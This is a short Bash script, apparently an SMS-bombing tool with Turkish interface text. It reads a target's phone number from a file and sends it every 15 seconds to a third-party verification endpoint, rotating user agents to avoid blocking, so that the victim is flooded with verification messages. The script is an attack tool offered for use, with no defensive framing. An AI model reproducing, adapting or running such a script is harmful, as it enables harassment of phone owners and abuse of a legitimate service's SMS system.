#!/bin/bash
number=$(cat numara.txt)
clear
bash banner.sh
progress () {
echo -ne "            \e[42;30mSending: [10%]\e[0;97m  [##.......................]\r"
sleep 2
echo -ne "            \e[42;30mSending: [25%]\e[0;97m  [#####....................]\r"
sleep 2
echo -ne "            \e[42;30mSending: [50%]\e[0;97m  [############.............]\r"
sleep 2
echo -ne "            \e[42;30mSending: [75%]\e[0;97m  [###################......]\r"
sleep 2
echo -ne "            \e[42;30mSending: [100%]\e[0;97m [#########################]\r"
echo -ne '\n'
}
echo
echo
echo
echo
echo
echo
progress
echo
echo
echo
echo
printf "\e[33m
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\e[97m

               BAĞLANTIYI KESMEK İÇİN\e[31m >> \e[97m[\e[31m CTRL C \e[97m]\e[33m

            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\e[97m"
echo
echo
echo
curl -s --http2 -X POST -A "$(sed -n 1000p user-agents.txt)$$" -H "accept:application/json, text/plain, */*" -H "authorization:undefined" -H "save-data:on" -H "content-type:application/json;charset=UTF-8" -d '{"phone_number":"'"$number"'"}' "https://service.mokapos.com/account/v1/verification/phone/send" > .send
total=$(cat user-agents.txt |wc -l)
#sv-disable tor
for user_line in `seq 1 $total`;do
	sleep 15
	echo
	#sv up tor
	curl -s --http2 -X POST -A "$(sed -n $user_line\p user-agents.txt)$$" -H "accept:application/json, text/plain, */*" -H "authorization:undefined" -H "save-data:on" -H "content-type:application/json;charset=UTF-8" -d '{"phone_number":"'"$number"'"}' "https://service.mokapos.com/account/v1/verification/phone/send" > .send
	control=$(cat .send |grep -o '"request_id":null')
	if [[ ! -n $control ]];then
		echo
		echo
		echo
		printf "\e[1;32m[✓]\e[32m +-+-+-+-+-+-+-+-+-+->> \e[97mSenDinNG"
		echo
		echo
		echo
	fi
	rm .send
	#sv-disable tor
done
exit
